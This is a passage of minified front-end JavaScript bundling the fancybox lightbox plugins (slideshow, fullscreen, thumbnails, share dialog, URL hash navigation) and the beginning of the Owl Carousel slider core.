            t.$button = t.instance.$refs.toolbar.find("[data-fancybox-play]").on("click", (function() {
                t.toggle()
            })), (t.instance.group.length < 2 || !t.instance.group[t.instance.currIndex].opts.slideShow) && t.$button.hide()
        },
        set: function(t) {
            var e = this;
            e.instance && e.instance.current && (!0 === t || e.instance.current.opts.loop || e.instance.currIndex < e.instance.group.length - 1) ? e.timer = setTimeout((function() {
                e.isActive && e.instance.jumpTo((e.instance.currIndex + 1) % e.instance.group.length)
            }), e.instance.current.opts.slideShow.speed) : (e.stop(), e.instance.idleSecondsCounter = 0, e.instance.showControls())
        },
        clear: function() {
            clearTimeout(this.timer), this.timer = null
        },
        start: function() {
            var t = this,
                e = t.instance.current;
            e && (t.isActive = !0, t.$button.attr("title", e.opts.i18n[e.opts.lang].PLAY_STOP).removeClass("fancybox-button--play").addClass("fancybox-button--pause"), t.set(!0))
        },
        stop: function() {
            var t = this,
                e = t.instance.current;
            t.clear(), t.$button.attr("title", e.opts.i18n[e.opts.lang].PLAY_START).removeClass("fancybox-button--pause").addClass("fancybox-button--play"), t.isActive = !1
        },
        toggle: function() {
            var t = this;
            t.isActive ? t.stop() : t.start()
        }
    }), e(t).on({
        "onInit.fb": function(t, e) {
            e && !e.SlideShow && (e.SlideShow = new n(e))
        },
        "beforeShow.fb": function(t, e, n, i) {
            var o = e && e.SlideShow;
            i ? o && n.opts.slideShow.autoStart && o.start() : o && o.isActive && o.clear()
        },
        "afterShow.fb": function(t, e, n) {
            var i = e && e.SlideShow;
            i && i.isActive && i.set()
        },
        "afterKeydown.fb": function(n, i, o, r, s) {
            var a = i && i.SlideShow;
            !a || !o.opts.slideShow || 80 !== s && 32 !== s || e(t.activeElement).is("button,a,input") || (r.preventDefault(), a.toggle())
        },
        "beforeClose.fb onDeactivate.fb": function(t, e) {
            var n = e && e.SlideShow;
            n && n.stop()
        }
    }), e(t).on("visibilitychange", (function() {
        var n = e.fancybox.getInstance(),
            i = n && n.SlideShow;
        i && i.isActive && (t.hidden ? i.clear() : i.set())
    }))
}(document, window.jQuery || jQuery),
function(t, e) {
    "use strict";
    var n = function() {
        var e, n, i, o = [
                ["requestFullscreen", "exitFullscreen", "fullscreenElement", "fullscreenEnabled", "fullscreenchange", "fullscreenerror"],
                ["webkitRequestFullscreen", "webkitExitFullscreen", "webkitFullscreenElement", "webkitFullscreenEnabled", "webkitfullscreenchange", "webkitfullscreenerror"],
                ["webkitRequestFullScreen", "webkitCancelFullScreen", "webkitCurrentFullScreenElement", "webkitCancelFullScreen", "webkitfullscreenchange", "webkitfullscreenerror"],
                ["mozRequestFullScreen", "mozCancelFullScreen", "mozFullScreenElement", "mozFullScreenEnabled", "mozfullscreenchange", "mozfullscreenerror"],
                ["msRequestFullscreen", "msExitFullscreen", "msFullscreenElement", "msFullscreenEnabled", "MSFullscreenChange", "MSFullscreenError"]
            ],
            r = {};
        for (n = 0; n < o.length; n++)
            if ((e = o[n]) && e[1] in t) {
                for (i = 0; i < e.length; i++) r[o[0][i]] = e[i];
                return r
            }
        return !1
    }();
    if (n) {
        var i = {
            request: function(e) {
                (e = e || t.documentElement)[n.requestFullscreen](e.ALLOW_KEYBOARD_INPUT)
            },
            exit: function() {
                t[n.exitFullscreen]()
            },
            toggle: function(e) {
                e = e || t.documentElement, this.isFullscreen() ? this.exit() : this.request(e)
            },
            isFullscreen: function() {
                return Boolean(t[n.fullscreenElement])
            },
            enabled: function() {
                return Boolean(t[n.fullscreenEnabled])
            }
        };
        e.extend(!0, e.fancybox.defaults, {
            btnTpl: {
                fullScreen: '<button data-fancybox-fullscreen class="fancybox-button fancybox-button--fullscreen" title="{{FULL_SCREEN}}"><svg viewBox="0 0 40 40"><path d="M9,12 h22 v16 h-22 v-16 v16 h22 v-16 Z" /></svg></button>'
            },
            fullScreen: {
                autoStart: !1
            }
        }), e(t).on({
            "onInit.fb": function(t, e) {
                var n;
                e && e.group[e.currIndex].opts.fullScreen ? ((n = e.$refs.container).on("click.fb-fullscreen", "[data-fancybox-fullscreen]", (function(t) {
                    t.stopPropagation(), t.preventDefault(), i.toggle(n[0])
                })), e.opts.fullScreen && !0 === e.opts.fullScreen.autoStart && i.request(n[0]), e.FullScreen = i) : e && e.$refs.toolbar.find("[data-fancybox-fullscreen]").hide()
            },
            "afterKeydown.fb": function(t, e, n, i, o) {
                e && e.FullScreen && 70 === o && (i.preventDefault(), e.FullScreen.toggle(e.$refs.container[0]))
            },
            "beforeClose.fb": function(t) {
                t && t.FullScreen && i.exit()
            }
        }), e(t).on(n.fullscreenchange, (function() {
            var t = i.isFullscreen(),
                n = e.fancybox.getInstance();
            n && (n.current && "image" === n.current.type && n.isAnimating && (n.current.$content.css("transition", "none"), n.isAnimating = !1, n.update(!0, !0, 0)), n.trigger("onFullscreenChange", t), n.$refs.container.toggleClass("fancybox-is-fullscreen", t))
        }))
    } else e && e.fancybox && (e.fancybox.defaults.btnTpl.fullScreen = !1)
}(document, window.jQuery || jQuery),
function(t, e) {
    "use strict";
    e.fancybox.defaults = e.extend(!0, {
        btnTpl: {
            thumbs: '<button data-fancybox-thumbs class="fancybox-button fancybox-button--thumbs" title="{{THUMBS}}"><svg viewBox="0 0 120 120"><path d="M30,30 h14 v14 h-14 Z M50,30 h14 v14 h-14 Z M70,30 h14 v14 h-14 Z M30,50 h14 v14 h-14 Z M50,50 h14 v14 h-14 Z M70,50 h14 v14 h-14 Z M30,70 h14 v14 h-14 Z M50,70 h14 v14 h-14 Z M70,70 h14 v14 h-14 Z" /></svg></button>'
        },
        thumbs: {
            autoStart: !1,
            hideOnClose: !0,
            parentEl: ".fancybox-container",
            axis: "y"
        }
    }, e.fancybox.defaults);
    var n = function(t) {
        this.init(t)
    };
    e.extend(n.prototype, {
        $button: null,
        $grid: null,
        $list: null,
        isVisible: !1,
        isActive: !1,
        init: function(t) {
            var e = this;
            e.instance = t, t.Thumbs = e;
            var n = t.group[0],
                i = t.group[1];
            e.opts = t.group[t.currIndex].opts.thumbs, e.$button = t.$refs.toolbar.find("[data-fancybox-thumbs]"), e.opts && n && i && ("image" == n.type || n.opts.thumb || n.opts.$thumb) && ("image" == i.type || i.opts.thumb || i.opts.$thumb) ? (e.$button.show().on("click", (function() {
                e.toggle()
            })), e.isActive = !0) : e.$button.hide()
        },
        create: function() {
            var t, n, i = this,
                o = i.instance,
                r = i.opts.parentEl;
            i.$grid = e('<div class="fancybox-thumbs fancybox-thumbs-' + i.opts.axis + '"></div>').appendTo(o.$refs.container.find(r).addBack().filter(r)), t = "<ul>", e.each(o.group, (function(e, i) {
                (n = i.opts.thumb || (i.opts.$thumb ? i.opts.$thumb.attr("src") : null)) || "image" !== i.type || (n = i.src), n && n.length && (t += '<li data-index="' + e + '"  tabindex="0" class="fancybox-thumbs-loading"><img data-src="' + n + '" /></li>')
            })), t += "</ul>", i.$list = e(t).appendTo(i.$grid).on("click", "li", (function() {
                o.jumpTo(e(this).data("index"))
            })), i.$list.find("img").hide().one("load", (function() {
                var t, n, i, o, r = e(this).parent().removeClass("fancybox-thumbs-loading"),
                    s = r.outerWidth(),
                    a = r.outerHeight();
                t = this.naturalWidth || this.width, o = (n = this.naturalHeight || this.height) / a, (i = t / s) >= 1 && o >= 1 && (i > o ? (t /= o, n = a) : (t = s, n /= i)), e(this).css({
                    width: Math.floor(t),
                    height: Math.floor(n),
                    "margin-top": n > a ? Math.floor(.3 * a - .3 * n) : Math.floor(.5 * a - .5 * n),
                    "margin-left": Math.floor(.5 * s - .5 * t)
                }).show()
            })).each((function() {
                this.src = e(this).data("src")
            })), "x" === i.opts.axis && i.$list.width(parseInt(i.$grid.css("padding-right")) + o.group.length * i.$list.children().eq(0).outerWidth(!0) + "px")
        },
        focus: function(t) {
            var e, n, i = this,
                o = i.$list;
            i.instance.current && (n = (e = o.children().removeClass("fancybox-thumbs-active").filter('[data-index="' + i.instance.current.index + '"]').addClass("fancybox-thumbs-active")).position(), "y" === i.opts.axis && (n.top < 0 || n.top > o.height() - e.outerHeight()) ? o.stop().animate({
                scrollTop: o.scrollTop() + n.top
            }, t) : "x" === i.opts.axis && (n.left < o.parent().scrollLeft() || n.left > o.parent().scrollLeft() + (o.parent().width() - e.outerWidth())) && o.parent().stop().animate({
                scrollLeft: n.left
            }, t))
        },
        update: function() {
            this.instance.$refs.container.toggleClass("fancybox-show-thumbs", this.isVisible), this.isVisible ? (this.$grid || this.create(), this.instance.trigger("onThumbsShow"), this.focus(0)) : this.$grid && this.instance.trigger("onThumbsHide"), this.instance.update()
        },
        hide: function() {
            this.isVisible = !1, this.update()
        },
        show: function() {
            this.isVisible = !0, this.update()
        },
        toggle: function() {
            this.isVisible = !this.isVisible, this.update()
        }
    }), e(t).on({
        "onInit.fb": function(t, e) {
            var i;
            e && !e.Thumbs && ((i = new n(e)).isActive && !0 === i.opts.autoStart && i.show())
        },
        "beforeShow.fb": function(t, e, n, i) {
            var o = e && e.Thumbs;
            o && o.isVisible && o.focus(i ? 0 : 250)
        },
        "afterKeydown.fb": function(t, e, n, i, o) {
            var r = e && e.Thumbs;
            r && r.isActive && 71 === o && (i.preventDefault(), r.toggle())
        },
        "beforeClose.fb": function(t, e) {
            var n = e && e.Thumbs;
            n && n.isVisible && !1 !== n.opts.hideOnClose && n.$grid.hide()
        }
    })
}(document, window.jQuery),
function(t, e) {
    "use strict";
    e.extend(!0, e.fancybox.defaults, {
        btnTpl: {
            share: '<button data-fancybox-share class="fancybox-button fancybox-button--share" title="{{SHARE}}"><svg viewBox="0 0 40 40"><path d="M6,30 C8,18 19,16 23,16 L23,16 L23,10 L33,20 L23,29 L23,24 C19,24 8,27 6,30 Z"></svg></button>'
        },
        share: {
            tpl: '<div class="fancybox-share"><h1>{{SHARE}}</h1><p><a href="https://www.facebook.com/sharer/sharer.php?u={{src}}" target="_blank" class="fancybox-share_button"><svg version="1.1" viewBox="0 0 32 32" fill="#3b5998"><path d="M27.6 3h-23.2c-.8 0-1.4.6-1.4 1.4v23.1c0 .9.6 1.5 1.4 1.5h12.5v-10.1h-3.4v-3.9h3.4v-2.9c0-3.4 2.1-5.2 5-5.2 1.4 0 2.7.1 3 .2v3.5h-2.1c-1.6 0-1.9.8-1.9 1.9v2.5h3.9l-.5 3.9h-3.4v10.1h6.6c.8 0 1.4-.6 1.4-1.4v-23.2c.1-.8-.5-1.4-1.3-1.4z"></path></svg><span>Facebook</span></a><a href="https://www.pinterest.com/pin/create/button/?url={{src}}&amp;description={{descr}}" target="_blank" class="fancybox-share_button"><svg version="1.1" viewBox="0 0 32 32" fill="#c92228"><path d="M16 3c-7.2 0-13 5.8-13 13 0 5.5 3.4 10.2 8.3 12.1-.1-1-.2-2.6 0-3.7.2-1 1.5-6.5 1.5-6.5s-.4-.8-.4-1.9c0-1.8 1-3.2 2.4-3.2 1.1 0 1.6.8 1.6 1.8 0 1.1-.7 2.8-1.1 4.3-.3 1.3.6 2.3 1.9 2.3 2.3 0 4.1-2.4 4.1-6 0-3.1-2.2-5.3-5.4-5.3-3.7 0-5.9 2.8-5.9 5.6 0 1.1.4 2.3 1 3 .1.1.1.2.1.4-.1.4-.3 1.3-.4 1.5-.1.2-.2.3-.4.2-1.6-.8-2.6-3.1-2.6-5 0-4.1 3-7.9 8.6-7.9 4.5 0 8 3.2 8 7.5 0 4.5-2.8 8.1-6.7 8.1-1.3 0-2.6-.7-3-1.5 0 0-.7 2.5-.8 3.1-.3 1.1-1.1 2.5-1.6 3.4 1.2.4 2.5.6 3.8.6 7.2 0 13-5.8 13-13 0-7.1-5.8-12.9-13-12.9z"></path></svg><span>Pinterest</span></a><a href="https://twitter.com/intent/tweet?url={{src}}&amp;text={{descr}}" target="_blank" class="fancybox-share_button"><svg version="1.1" viewBox="0 0 32 32" fill="#1da1f2"><path d="M30 7.3c-1 .5-2.1.8-3.3.9 1.2-.7 2.1-1.8 2.5-3.2-1.1.7-2.3 1.1-3.6 1.4-1-1.1-2.5-1.8-4.2-1.8-3.2 0-5.7 2.6-5.7 5.7 0 .5.1.9.1 1.3-4.8-.2-9-2.5-11.8-6-.5.9-.8 1.9-.8 3 0 2 1 3.8 2.6 4.8-.9 0-1.8-.3-2.6-.7v.1c0 2.8 2 5.1 4.6 5.6-.5.1-1 .2-1.5.2-.4 0-.7 0-1.1-.1.7 2.3 2.9 3.9 5.4 4-2 1.5-4.4 2.5-7.1 2.5-.5 0-.9 0-1.4-.1 2.5 1.6 5.6 2.6 8.8 2.6 10.6 0 16.3-8.8 16.3-16.3v-.7c1.1-1 2-2 2.8-3.2z"></path></svg><span>Twitter</span></a></p><p><input type="text" value="{{src_raw}}" onfocus="this.select()" /></p></div>'
        }
    }), e(t).on("click", "[data-fancybox-share]", (function() {
        var t, n, i = e.fancybox.getInstance();
        i && (t = !1 === i.current.opts.hash ? i.current.src : window.location, n = i.current.opts.share.tpl.replace(/\{\{src\}\}/g, encodeURIComponent(t)).replace(/\{\{src_raw\}\}/g, function(t) {
            var e = {
                "&": "&amp;",
                "<": "&lt;",
                ">": "&gt;",
                '"': "&quot;",
                "'": "&#39;",
                "/": "&#x2F;",
                "`": "&#x60;",
                "=": "&#x3D;"
            };
            return String(t).replace(/[&<>"'`=\/]/g, (function(t) {
                return e[t]
            }))
        }(t)).replace(/\{\{descr\}\}/g, i.$caption ? encodeURIComponent(i.$caption.text()) : ""), e.fancybox.open({
            src: i.translate(i, n),
            type: "html",
            opts: {
                animationEffect: "fade",
                animationDuration: 250
            }
        }))
    }))
}(document, window.jQuery || jQuery),
function(t, e, n) {
    "use strict";

    function i() {
        var t = e.location.hash.substr(1),
            n = t.split("-"),
            i = n.length > 1 && /^\+?\d+$/.test(n[n.length - 1]) && parseInt(n.pop(-1), 10) || 1;
        return i < 1 && (i = 1), {
            hash: t,
            index: i,
            gallery: n.join("-")
        }
    }

    function o(t) {
        var e;
        "" !== t.gallery && ((e = n("[data-fancybox='" + n.escapeSelector(t.gallery) + "']").eq(t.index - 1)).length || (e = n("#" + n.escapeSelector(t.gallery))), e.length && (s = !1, e.trigger("click")))
    }

    function r(t) {
        var e;
        return !!t && ((e = t.current ? t.current.opts : t.opts).hash || (e.$orig ? e.$orig.data("fancybox") : ""))
    }
    n.escapeSelector || (n.escapeSelector = function(t) {
        return (t + "").replace(/([\0-\x1f\x7f]|^-?\d)|^-$|[^\x80-\uFFFF\w-]/g, (function(t, e) {
            return e ? "\0" === t ? "�" : t.slice(0, -1) + "\\" + t.charCodeAt(t.length - 1).toString(16) + " " : "\\" + t
        }))
    });
    var s = !0,
        a = null,
        l = null;
    n((function() {
        !1 !== n.fancybox.defaults.hash && (n(t).on({
            "onInit.fb": function(t, e) {
                var n, o;
                !1 !== e.group[e.currIndex].opts.hash && (n = i(), (o = r(e)) && n.gallery && o == n.gallery && (e.currIndex = n.index - 1))
            },
            "beforeShow.fb": function(n, i, o) {
                var c;
                o && !1 !== o.opts.hash && ((c = r(i)) && "" !== c && (e.location.hash.indexOf(c) < 0 && (i.opts.origHash = e.location.hash), a = c + (i.group.length > 1 ? "-" + (o.index + 1) : ""), "replaceState" in e.history ? (l && clearTimeout(l), l = setTimeout((function() {
                    e.history[s ? "pushState" : "replaceState"]({}, t.title, e.location.pathname + e.location.search + "#" + a), l = null, s = !1
                }), 300)) : e.location.hash = a))
            },
            "beforeClose.fb": function(i, o, s) {
                var c, u;
                l && clearTimeout(l), !1 !== s.opts.hash && (c = r(o), u = o && o.opts.origHash ? o.opts.origHash : "", c && "" !== c && ("replaceState" in history ? e.history.replaceState({}, t.title, e.location.pathname + e.location.search + u) : (e.location.hash = u, n(e).scrollTop(o.scrollTop).scrollLeft(o.scrollLeft))), a = null)
            }
        }), n(e).on("hashchange.fb", (function() {
            var t = i();
            n.fancybox.getInstance() ? !a || a === t.gallery + "-" + t.index || 1 === t.index && a == t.gallery || (a = null, n.fancybox.close()) : "" !== t.gallery && o(t)
        })), setTimeout((function() {
            o(i())
        }), 50))
    }))
}(document, window, window.jQuery || jQuery),
function(t, e, n, i) {
    function o(e, n) {
        this.settings = null, this.options = t.extend({}, o.Defaults, n), this.$element = t(e), this._handlers = {}, this._plugins = {}, this._supress = {}, this._current = null, this._speed = null, this._coordinates = [], this._breakpoint = null, this._width = null, this._items = [], this._clones = [], this._mergers = [], this._widths = [], this._invalidated = {}, this._pipe = [], this._drag = {
            time: null,
            target: null,
            pointer: null,
            stage: {
                start: null,
                current: null
            },
            direction: null
        }, this._states = {
            current: {},
            tags: {
                initializing: ["busy"],
                animating: ["busy"],
                dragging: ["interacting"]
            }
        }, t.each(["onResize", "onThrottledResize"], t.proxy((function(e, n) {
            this._handlers[n] = t.proxy(this[n], this)
        }), this)), t.each(o.Plugins, t.proxy((function(t, e) {
            this._plugins[t.charAt(0).toLowerCase() + t.slice(1)] = new e(this)
        }), this)), t.each(o.Workers, t.proxy((function(e, n) {
            this._pipe.push({
                filter: n.filter,
                run: t.proxy(n.run, this)
            })
        }), this)), this.setup(), this.initialize()
    }
    o.Defaults = {
        items: 3,
        loop: !1,
        center: !1,
        rewind: !1,
        mouseDrag: !0,
        touchDrag: !0,
        pullDrag: !0,
        freeDrag: !1,
        margin: 0,
        stagePadding: 0,
        merge: !1,
        mergeFit: !0,
        autoWidth: !1,
        startPosition: 0,
        rtl: !1,
        smartSpeed: 250,
        fluidSpeed: !1,
        dragEndSpeed: !1,
        responsive: {},
        responsiveRefreshRate: 200,
        responsiveBaseElement: e,
        fallbackEasing: "swing",
        info: !1,
        nestedItemSelector: !1,
        itemElement: "div",
        stageElement: "div",
        refreshClass: "owl-refresh",
        loadedClass: "owl-loaded",
        loadingClass: "owl-loading",
        rtlClass: "owl-rtl",
        responsiveClass: "owl-responsive",
        dragClass: "owl-drag",
        itemClass: "owl-item",
        stageClass: "owl-stage",
        stageOuterClass: "owl-stage-outer",
        grabClass: "owl-grab"
    }, o.Width = {
        Default: "default",
        Inner: "inner",
        Outer: "outer"
    }, o.Type = {
        Event: "event",
        State: "state"
    }, o.Plugins = {}, o.Workers = [{
        filter: ["width", "settings"],
        run: function() {
            this._width = this.$element.width()
        }
    }, {
        filter: ["width", "items", "settings"],
        run: function(t) {
            t.current = this._items && this._items[this.relative(this._current)]
        }
    }, {
        filter: ["items", "settings"],
        run: function() {
            this.$stage.children(".cloned").remove()
        }
    }, {
        filter: ["width", "items", "settings"],
        run: function(t) {
            var e = this.settings.margin || "",
                n = !this.settings.autoWidth,
                i = this.settings.rtl,
                o = {
                    width: "auto",
                    "margin-left": i ? e : "",
                    "margin-right": i ? "" : e
                };
            !n && this.$stage.children().css(o), t.css = o
        }
    }, {
        filter: ["width", "items", "settings"],
        run: function(t) {
            var e = (this.width() / this.settings.items).toFixed(3) - this.settings.margin,
                n = null,
                i = this._items.length,
                o = !this.settings.autoWidth,
                r = [];
            for (t.items = {
                    merge: !1,
                    width: e
                }; i--;) n = this._mergers[i], n = this.settings.mergeFit && Math.min(n, this.settings.items) || n, t.items.merge = n > 1 || t.items.merge, r[i] = o ? e * n : this._items[i].width();
            this._widths = r
        }
    }, {
        filter: ["items", "settings"],
        run: function() {
            var e = [],
                n = this._items,
                i = this.settings,
                o = Math.max(2 * i.items, 4),
                r = 2 * Math.ceil(n.length / 2),
                s = i.loop && n.length ? i.rewind ? o : Math.max(o, r) : 0,
                a = "",
                l = "";
            for (s /= 2; s--;) e.push(this.normalize(e.length / 2, !0)), a += n[e[e.length - 1]][0].outerHTML, e.push(this.normalize(n.length - 1 - (e.length - 1) / 2, !0)), l = n[e[e.length - 1]][0].outerHTML + l;
            this._clones = e, t(a).addClass("cloned").appendTo(this.$stage), t(l).addClass("cloned").prependTo(this.$stage)
        }
    }, {
        filter: ["width", "items", "settings"],
        run: function() {
            for (var t = this.settings.rtl ? 1 : -1, e = this._clones.length + this._items.length, n = -1, i = 0, o = 0, r = []; ++n < e;) i = r[n - 1] || 0, o = this._widths[this.relative(n)] + this.settings.margin, r.push(i + o * t);
            this._coordinates = r
        }
    }, {
        filter: ["width", "items", "settings"],
        run: function() {
            var t = this.settings.stagePadding,
                e = this._coordinates,
                n = {
                    width: Math.ceil(Math.abs(e[e.length - 1])) + 2 * t,
                    "padding-left": t || "",
                    "padding-right": t || ""
                };
            this.$stage.css(n)
        }
    }, {
        filter: ["width", "items", "settings"],
        run: function(t) {
            var e = this._coordinates.length,
                n = !this.settings.autoWidth,
                i = this.$stage.children();
            if (n && t.items.merge)
                for (; e--;) t.css.width = this._widths[this.relative(e)], i.eq(e).css(t.css);
            else n && (t.css.width = t.items.width, i.css(t.css))
        }
    }, {
        filter: ["items"],
        run: function() {
            this._coordinates.length < 1 && this.$stage.removeAttr("style")
        }
    }, {
        filter: ["width", "items", "settings"],
        run: function(t) {
            t.current = t.current ? this.$stage.children().index(t.current) : 0, t.current = Math.max(this.minimum(), Math.min(this.maximum(), t.current)), this.reset(t.current)
        }
    }, {
        filter: ["position"],
        run: function() {
            this.animate(this.coordinates(this._current))
        }
    }, {
        filter: ["width", "position", "items", "settings"],
        run: function() {
            var t, e, n, i, o = this.settings.rtl ? 1 : -1,
                r = 2 * this.settings.stagePadding,
                s = this.coordinates(this.current()) + r,
                a = s + this.width() * o,
                l = [];
            for (n = 0, i = this._coordinates.length; n < i; n++) t = this._coordinates[n - 1] || 0, e = Math.abs(this._coordinates[n]) + r * o, (this.op(t, "<=", s) && this.op(t, ">", a) || this.op(e, "<", s) && this.op(e, ">", a)) && l.push(n);
            this.$stage.children(".active").removeClass("active"), this.$stage.children(":eq(" + l.join("), :eq(") + ")").addClass("active"), this.settings.center && (this.$stage.children(".center").removeClass("center"), this.$stage.children().eq(this.current()).addClass("center"))
        }
    }], o.prototype.initialize = function() {
        var e, n, o;
        (this.enter("initializing"), this.trigger("initialize"), this.$element.toggleClass(this.settings.rtlClass, this.settings.rtl), this.settings.autoWidth && !this.is("pre-loading")) && (e = this.$element.find("img"), n = this.settings.nestedItemSelector ? "." + this.settings.nestedItemSelector : i, o = this.$element.children(n).width(), e.length && o <= 0 && this.preloadAutoWidthImages(e));
        this.$element.addClass(this.options.loadingClass), this.$stage = t("<" + this.settings.stageElement + ' class="' + this.settings.stageClass + '"/>').wrap('<div class="' + this.settings.stageOuterClass + '"/>'), this.$element.append(this.$stage.parent()), this.replace(this.$element.children().not(this.$stage.parent())), this.$element.is(":visible") ? this.refresh() : this.invalidate("width"), this.$element.removeClass(this.options.loadingClass).addClass(this.options.loadedClass), this.registerEventHandlers(), this.leave("initializing"), this.trigger("initialized")
    }, o.prototype.setup = function() {
        var e = this.viewport(),
            n = this.options.responsive,
            i = -1,
            o = null;
        n ? (t.each(n, (function(t) {
            t <= e && t > i && (i = Number(t))
        })), "function" == typeof(o = t.extend({}, this.options, n[i])).stagePadding && (o.stagePadding = o.stagePadding()), delete o.responsive, o.responsiveClass && this.$element.attr("class", this.$element.attr("class").replace(new RegExp("(" + this.options.responsiveClass + "-)\\S+\\s", "g"), "$1" + i))) : o = t.extend({}, this.options), this.trigger("change", {
            property: {
                name: "settings",
                value: o
            }
        }), this._breakpoint = i, this.settings = o, this.invalidate("settings"), this.trigger("changed", {
            property: {
                name: "settings",
                value: this.settings
            }
        })
    }, o.prototype.optionsLogic = function() {
        this.settings.autoWidth && (this.settings.stagePadding = !1, this.settings.merge = !1)
    }, o.prototype.prepare = function(e) {
        var n = this.trigger("prepare", {
            content: e
        });
        return n.data || (n.data = t("<" + this.settings.itemElement + "/>").addClass(this.options.itemClass).append(e)), this.trigger("prepared", {
            content: n.data
        }), n.data
    }, o.prototype.update = function() {
        for (var e = 0, n = this._pipe.length, i = t.proxy((function(t) {
                return this[t]
            }), this._invalidated), o = {}; e < n;)(this._invalidated.all || t.grep(this._pipe[e].filter, i).length > 0) && this._pipe[e].run(o), e++;
        this._invalidated = {}, !this.is("valid") && this.enter("valid")
    }, o.prototype.width = function(t) {
        switch (t = t || o.Width.Default) {
            case o.Width.Inner:
            case o.Width.Outer:
                return this._width;
            default:
                return this._width - 2 * this.settings.stagePadding + this.settings.margin
        }
    }, o.prototype.refresh = function() {
        this.enter("refreshing"), this.trigger("refresh"), this.setup(), this.optionsLogic(), this.$element.addClass(this.options.refreshClass), this.update(), this.$element.removeClass(this.options.refreshClass), this.leave("refreshing"), this.trigger("refreshed")
    }, o.prototype.onThrottledResize = function() {
        e.clearTimeout(this.resizeTimer), this.resizeTimer = e.setTimeout(this._handlers.onResize, this.settings.responsiveRefreshRate)
    }, o.prototype.onResize = function() {
        return !!this._items.length && this._width !== this.$element.width() && !!this.$element.is(":visible") && (this.enter("resizing"), this.trigger("resize").isDefaultPrevented() ? (this.leave("resizing"), !1) : (this.invalidate("width"), this.refresh(), this.leave("resizing"), void this.trigger("resized")))
    }, o.prototype.registerEventHandlers = function() {
        t.support.transition && this.$stage.on(t.support.transition.end + ".owl.core", t.proxy(this.onTransitionEnd, this)), !1 !== this.settings.responsive && this.on(e, "resize", this._handlers.onThrottledResize), this.settings.mouseDrag && (this.$element.addClass(this.options.dragClass), this.$stage.on("mousedown.owl.core", t.proxy(this.onDragStart, this)), this.$stage.on("dragstart.owl.core selectstart.owl.core", (function() {
            return !1
        }))), this.settings.touchDrag && (this.$stage.on("touchstart.owl.core", t.proxy(this.onDragStart, this)), this.$stage.on("touchcancel.owl.core", t.proxy(this.onDragEnd, this)))
    }, o.prototype.onDragStart = function(e) {
        var i = null;
        3 !== e.which && (t.support.transform ? i = {
            x: (i = this.$stage.css("transform").replace(/.*\(|\)| /g, "").split(","))[16 === i.length ? 12 : 4],
            y: i[16 === i.length ? 13 : 5]
        } : (i = this.$stage.position(), i = {
            x: this.settings.rtl ? i.left + this.$stage.width() - this.width() + this.settings.margin : i.left,
            y: i.top
        }), this.is("animating") && (t.support.transform ? this.animate(i.x) : this.$stage.stop(), this.invalidate("position")), this.$element.toggleClass(this.options.grabClass, "mousedown" === e.type), this.speed(0), this._drag.time = (new Date).getTime(), this._drag.target = t(e.target), this._drag.stage.start = i, this._drag.stage.current = i, this._drag.pointer = this.pointer(e), t(n).on("mouseup.owl.core touchend.owl.core", t.proxy(this.onDragEnd, this)), t(n).one("mousemove.owl.core touchmove.owl.core", t.proxy((function(e) {
            var i = this.difference(this._drag.pointer, this.pointer(e));
            t(n).on("mousemove.owl.core touchmove.owl.core", t.proxy(this.onDragMove, this)), Math.abs(i.x) < Math.abs(i.y) && this.is("valid") || (e.preventDefault(), this.enter("dragging"), this.trigger("drag"))
        }), this)))
    }, o.prototype.onDragMove = function(t) {
        var e = null,
            n = null,
            i = null,
            o = this.difference(this._drag.pointer, this.pointer(t)),
            r = this.difference(this._drag.stage.start, o);
        this.is("dragging") && (t.preventDefault(), this.settings.loop ? (e = this.coordinates(this.minimum()), n = this.coordinates(this.maximum() + 1) - e, r.x = ((r.x - e) % n + n) % n + e) : (e = this.settings.rtl ? this.coordinates(this.maximum()) : this.coordinates(this.minimum()), n = this.settings.rtl ? this.coordinates(this.minimum()) : this.coordinates(this.maximum()), i = this.settings.pullDrag ? -1 * o.x / 5 : 0, r.x = Math.max(Math.min(r.x, e + i), n + i)), this._drag.stage.current = r, this.animate(r.x))
    }, o.prototype.onDragEnd = function(e) {
        var i = this.difference(this._drag.pointer, this.pointer(e)),
            o = this._drag.stage.current,
            r = i.x > 0 ^ this.settings.rtl ? "left" : "right";
        t(n).off(".owl.core"), this.$element.removeClass(this.options.grabClass), (0 !== i.x && this.is("dragging") || !this.is("valid")) && (this.speed(this.settings.dragEndSpeed || this.settings.smartSpeed), this.current(this.closest(o.x, 0 !== i.x ? r : this._drag.direction)), this.invalidate("position"), this.update(), this._drag.direction = r, (Math.abs(i.x) > 3 || (new Date).getTime() - this._drag.time > 300) && this._drag.target.one("click.owl.core", (function() {
            return !1
        }))), this.is("dragging") && (this.leave("dragging"), this.trigger("dragged"))
    }, o.prototype.closest = function(e, n) {
        var i = -1,
            o = this.width(),
            r = this.coordinates();
        return this.settings.freeDrag || t.each(r, t.proxy((function(t, s) {
            return "left" === n && e > s - 30 && e < s + 30 ? i = t : "right" === n && e > s - o - 30 && e < s - o + 30 ? i = t + 1 : this.op(e, "<", s) && this.op(e, ">", r[t + 1] || s - o) && (i = "left" === n ? t + 1 : t), -1 === i
        }), this)), this.settings.loop || (this.op(e, ">", r[this.minimum()]) ? i = e = this.minimum() : this.op(e, "<", r[this.maximum()]) && (i = e = this.maximum())), i
    }, o.prototype.animate = function(e) {
        var n = this.speed() > 0;
        this.is("animating") && this.onTransitionEnd(), n && (this.enter("animating"), this.trigger("translate")), t.support.transform3d && t.support.transition ? this.$stage.css({
            transform: "translate3d(" + e + "px,0px,0px)",
            transition: this.speed() / 1e3 + "s"
        }) : n ? this.$stage.animate({
            left: e + "px"
        }, this.speed(), this.settings.fallbackEasing, t.proxy(this.onTransitionEnd, this)) : this.$stage.css({
            left: e + "px"
        })
    }, o.prototype.is = function(t) {
        return this._states.current[t] && this._states.current[t] > 0
    }, o.prototype.current = function(t) {
        if (t === i) return this._current;
        if (0 === this._items.length) return i;
        if (t = this.normalize(t), this._current !== t) {
            var e = this.trigger("change", {
                property: {
                    name: "position",
                    value: t
                }
            });
            e.data !== i && (t = this.normalize(e.data)), this._current = t, this.invalidate("position"), this.trigger("changed", {
                property: {
                    name: "position",
                    value: this._current
                }
            })
        }
        return this._current
    }, o.prototype.invalidate = function(e) {
        return "string" === t.type(e) && (this._invalidated[e] = !0, this.is("valid") && this.leave("valid")), t.map(this._invalidated, (function(t, e) {
            return e
        }))
    }, o.prototype.reset = function(t) {
        (t = this.normalize(t)) !== i && (this._speed = 0, this._current = t, this.suppress(["translate", "translated"]), this.animate(this.coordinates(t)), this.release(["translate", "translated"]))
    }, o.prototype.normalize = function(t, e) {
        var n = this._items.length,
